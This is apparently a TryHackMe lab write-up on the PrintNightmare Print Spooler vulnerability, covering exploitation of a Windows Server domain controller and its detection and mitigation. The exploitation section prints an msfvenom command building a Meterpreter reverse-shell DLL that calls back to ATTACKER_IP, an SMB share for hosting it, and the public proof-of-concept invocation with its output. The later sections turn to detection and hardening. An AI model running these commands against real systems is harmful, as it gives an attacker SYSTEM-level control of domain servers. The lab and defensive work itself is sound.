---
title: "TryHackMe: PrintNightmare"
date: 2026-07-04 23:01:00 +0200
categories: [TryHackMe]
tags:
  - windows
  - active-directory
  - print-spooler
  - cve-2021-1675
  - cve-2021-34527
  - detection
  - wireshark
description: >-
  PrintNightmare demonstrated remote SYSTEM-level code execution through the
  Windows Print Spooler, followed by endpoint and network detection analysis
  using PrintService, Sysmon, Windows Security, and packet evidence.
author: lenovolegion7
media_subpath: /images/tryhackme_printnightmare
image:
  path: room_image.webp
  alt: "Original TryHackMe PrintNightmare room artwork"
toc: true
comments: false
---

PrintNightmare combines an offensive exploitation exercise with practical detection and mitigation work. The lab demonstrates how an authenticated low-privilege user can abuse remote Print Spooler printer-driver operations to make a Windows Server 2019 domain-controller-class target retrieve an attacker-hosted DLL and execute it with SYSTEM privileges. The defensive half of the room then traces the same behavior through PrintService logs, Sysmon, Windows Security telemetry, and packet analysis.

> Passwords, hashes, target addresses, and TryHackMe flags are redacted.
{: .prompt-warning }

[![TryHackMe PrintNightmare room card](room_card.webp){: w="306" h="270" .shadow }](https://tryhackme.com/room/printnightmarehpzqlp8){: .center }

## Print Spooler and Vulnerability Context

The Windows Print Spooler manages print jobs and printer-driver operations and commonly runs with high privileges. The room distinguishes two closely related issues:

- **CVE-2021-1675** — originally addressed as a Print Spooler privilege-escalation issue and associated with local exploitation scenarios.
- **CVE-2021-34527** — the distinct remotely exploitable PrintNightmare path that can allow arbitrary code execution through privileged spooler operations.

The risk is amplified on domain controllers because the Print Spooler may be enabled while the host also holds highly sensitive authentication and directory-service data.

## Validated Attack Path

1. **RPC exposure check** — `rpcdump.py` confirmed that the target exposed the Print Spooler RPC interfaces used by printer-driver operations.
2. **Payload staging** — an x64 Meterpreter DLL was generated and hosted from an attacker-controlled SMB share.
3. **Exploit invocation** — the public PrintNightmare proof-of-concept was executed with a low-privilege domain account and a UNC path to the malicious DLL.
4. **Remote driver loading** — the Print Spooler connected to the SMB share, retrieved the DLL, and loaded attacker-controlled code.
5. **SYSTEM execution** — the Metasploit handler received a Meterpreter session running with SYSTEM-equivalent privileges.
6. **Detection validation** — the room and supplied packet evidence were used to identify host, account, SMB, DCE/RPC, payload, and reverse-connection indicators.

> **Result:** The authorized lab workflow demonstrated remote SYSTEM-level code execution through the Windows Print Spooler.
{: .prompt-danger }

## Exploitation Workflow

The lab first generated the payload:

```console
$ msfvenom -p windows/x64/meterpreter/reverse_tcp \
  LHOST=ATTACKER_IP LPORT=4444 \
  -f dll -o malicious.dll
```

The DLL was exposed through an Impacket SMB share:

```console
$ smbserver.py share /root/Desktop/share/ -smb2support
```

Before exploitation, the Print Spooler RPC interfaces were checked:

```console
$ rpcdump.py @TARGET_IP | egrep 'MS-RPRN|MS-PAR'
Protocol: [MS-RPRN]: Print System Remote Protocol
Protocol: [MS-PAR]: Print System Asynchronous Remote Protocol
```

The proof-of-concept accepted a low-privilege domain credential and a UNC payload path. Passwords and addresses are intentionally redacted here:

```console
$ python3.9 CVE-2021-1675.py \
  Finance-01.THMdepartment.local/sjohnston:[REDACTED]@TARGET_IP \
  '\\ATTACKER_IP\share\malicious.dll'
```

Representative exploit output showed a successful `spoolss` bind, discovery of the printer-driver path, and staged loading of the remote DLL:

```console
[*] Connecting to ncacn_np:TARGET_IP[\PIPE\spoolss]
[+] Bind OK
[+] pDriverPath Found C:\Windows\System32\DriverStore\FileRepository\...\UNIDRV.DLL
[*] Executing \??\UNC\ATTACKER_IP\share\malicious.dll
[*] Try 1...
[*] Stage0: 0
```

The attacker-side SMB server then observed the victim request the hosted DLL, and the handler received a Meterpreter session.

## Findings

### F-01 — Remote SYSTEM Code Execution via Print Spooler

**Severity:** Critical

The vulnerable spooler path allowed a remote authenticated attacker to cause the privileged Print Spooler service to retrieve and load attacker-controlled DLL content.

**Impact:** SYSTEM-level execution on a domain-controller-class host represents complete host compromise and could enable credential theft, privileged account creation, security-control tampering, persistence, and broader Active Directory compromise.

**Remediation:**

- Install Microsoft security updates applicable to CVE-2021-34527 and the affected Windows version.
- Disable the Print Spooler on domain controllers where printing is not required.
- If the spooler must remain enabled, block inbound remote printing and tightly control printer-driver installation.
- Review Point and Print policy and registry settings to ensure elevation warnings are not suppressed.

### F-02 — Remote Print Spooler Exposure on a Critical Server

**Severity:** High

Remote printer RPC interfaces were reachable on a domain-controller-class system. Even when a particular exploit is patched, unnecessary spooler exposure increases the attack surface of a highly trusted host.

**Remediation:**

- Remove the service from systems without a business requirement.
- Disable inbound client connections through Group Policy where local printing must remain available.
- Restrict remote spooler access to approved management paths.

### F-03 — Attacker-Controlled DLL Retrieval over SMB

**Severity:** High

The exploit chain required the victim to retrieve a DLL from attacker-controlled storage over SMB. In the supplied packet evidence, the victim reached an attacker-hosted share and repeatedly referenced the malicious DLL.

**Impact:** Outbound SMB from critical servers can facilitate payload delivery, credential leakage, lateral movement, and other UNC-based exploitation workflows.

**Remediation:**

- Restrict outbound SMB from domain controllers and other critical servers.
- Alert on SMB connections from critical infrastructure to unapproved hosts.
- Correlate remote SMB access with Print Spooler activity.

### F-04 — Detection Depends on Explicit Telemetry

**Severity:** Medium

Several useful Print Spooler logs are not guaranteed to be enabled by default. Organizations that do not collect PrintService, Sysmon, Windows Security, and process/file telemetry may miss early exploitation indicators.

## Network Evidence

The supplied PCAP validates a representative PrintNightmare trace. Public IP addresses are redacted, but the host and protocol relationships remain visible:

```text
Victim host:        WIN-1O0UJBNP9G7.printnightmare.local
Local domain:       printnightmare.local
Authenticated user: lowprivlarry
Attacker address:   ATTACKER_IP
Malicious DLL:      letmein.dll
SMB path:           \\ATTACKER_IP\sharez\letmein.dll
Reverse channel:    victim -> ATTACKER_IP:4444
Encrypted traffic:  SMB3 transform frames
```

The capture contained SMB exchanges on TCP/445, a reverse channel to TCP/4444, and DCE/RPC/SMB artifacts associated with the spooler workflow. SMB3 encryption is particularly important because encrypted DCE/RPC transport can reduce visibility during packet inspection.

## Endpoint Detection

Useful Windows and Sysmon telemetry includes:

| Source | Event ID | Detection opportunity |
|---|---:|---|
| PrintService/Operational | 316 | Printer driver added or updated |
| PrintService/Admin | 808 | Print plug-in or malicious DLL load failure |
| PrintService/Operational | 811 | Failed operation revealing the dropped DLL path |
| SMBClient/Security | 31017 | Unsigned driver loading associated with `spoolsv.exe` |
| Windows System | 7031 | Unexpected Print Spooler service termination |
| Sysmon | 3 | Suspicious network connection |
| Sysmon | 11 | DLL creation under the spooler driver directory |
| Sysmon | 23 / 26 | Deleted malicious DLL artifacts |
| Windows Security | 5145 | Remote access to `\\*\IPC$` with target `spoolss` |

Additional behavioral hunting opportunities include:

```text
spoolsv.exe -> rundll32.exe
spoolsv.exe -> cmd.exe
spoolsv.exe -> powershell.exe
spoolsv.exe -> WerFault.exe
```

Monitor for suspicious DLL creation or loading under:

```text
C:\Windows\System32\spool\drivers\x64\3\
C:\Windows\System32\spool\drivers\x64\3\Old\
```

## Mitigation

Check the Print Spooler state:

```powershell
Get-Service -Name Spooler
```

Where printing is not required, stop and disable the service:

```powershell
Stop-Service -Name Spooler -Force
Set-Service -Name Spooler -StartupType Disabled
```

Where the spooler must remain enabled, disable inbound remote printing through:

```text
Computer Configuration
→ Administrative Templates
→ Printers
→ Allow Print Spooler to accept client connections
→ Disabled
```

After Group Policy changes:

```powershell
gpupdate /force
```

Point and Print policy values should also be reviewed so unsafe driver installation cannot occur without the expected elevation protections.

## Security Impact

The demonstrated attack crossed from a low-privilege authenticated domain context to SYSTEM-level code execution. On a domain controller, that access can threaten credentials, directory-service integrity, privileged accounts, security policy, and domain-wide trust.

The supplied evidence also illustrates why endpoint and network visibility should be combined. PrintService and Sysmon events can expose driver-loading behavior that may not be obvious in packet captures, while SMB and Security 5145 telemetry can reveal the remote source, account, and payload path.

## Evidence Limitations

The source material confirms that the Administrator Desktop flag was obtained during the room exercise, but the exact flag value was not present in the supplied evidence. It is therefore intentionally omitted rather than guessed.

The task-specific EVTX answer values were also not supplied. Event IDs and detection techniques documented above are taken from the room material, while the host, account, payload, share, and reverse-channel evidence comes from the supplied PCAP analysis.

## Retest Plan

1. Confirm the relevant Microsoft security updates are installed.
2. Verify the authorized proof-of-concept no longer results in privileged code execution.
3. Confirm the Print Spooler is disabled on domain controllers without a printing requirement.
4. Where the service must remain enabled, verify inbound client connections are blocked or restricted.
5. Confirm Point and Print settings require appropriate elevation.
6. Restrict outbound SMB from critical servers to approved destinations.
7. Generate benign spooler activity and confirm the SOC receives the expected PrintService, Sysmon, Security, and service-failure telemetry.

## Lessons Learned

PrintNightmare demonstrates why a seemingly routine Windows service can become a critical domain-level attack path when it combines remote RPC exposure, privileged driver loading, and broad deployment on sensitive servers.

The defensive takeaway is equally important: patching is essential, but reducing unnecessary spooler exposure, restricting SMB, hardening Point and Print, and collecting the right telemetry provide additional layers that can prevent or quickly identify similar exploitation paths.
